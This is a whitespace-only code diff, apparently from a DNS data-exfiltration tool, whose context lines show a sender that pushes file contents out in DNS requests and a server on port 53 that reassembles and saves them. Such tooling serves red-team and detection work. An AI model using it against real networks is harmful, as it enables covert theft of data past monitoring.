@@ -98,7 +98,7 @@ def dns_exfil(host, path_to_file, port=53, max_packet_size=128, time_delay=0.01)
 	dns_request = build_dns(host)
 	dns_request += DATA_TERMINATOR + NULL + DATA_TERMINATOR
 	s.sendto(dns_request, addr)
-	
+
 	return 0
 
 
@@ -138,7 +138,7 @@ def dns_server(host="demo.morirt.com", port=53, play_dead=True):
 			# Found initiation packet:
 			offset_delimiter = data.find(DELIMITER) + len(DELIMITER)
 			filename = data[data.find(INITIATION_STRING) + len(INITIATION_STRING):data.find(DELIMITER)]
-			crc32 = data[offset_delimiter: -1] 
+			crc32 = data[offset_delimiter: -1]
 			sys.stdout.write("Initiation file transfer from " + str(addr) + " with file: " + str(filename))
 			actual_file = ""
 			chunks_count = 0
@@ -157,7 +157,7 @@ def dns_server(host="demo.morirt.com", port=53, play_dead=True):
 			if crc32 == str(zlib.crc32(actual_file)):
 				sys.stdout.write("CRC32 match! Now saving file")
 				fh = open(filename + str(crc32), WRITE_BINARY)
-				fh.write(actual_file) 
+				fh.write(actual_file)
 				fh.close()
 				replay = "Got it. Thanks :)"
 				s.sendto(replay, addr)
@@ -171,7 +171,7 @@ def dns_server(host="demo.morirt.com", port=53, play_dead=True):
 			crc32 = ""
 			i = 0
 			addr = ""
-		
+
 		else:
 			sys.stdout.write("Regular packet. Not listing it.")
 
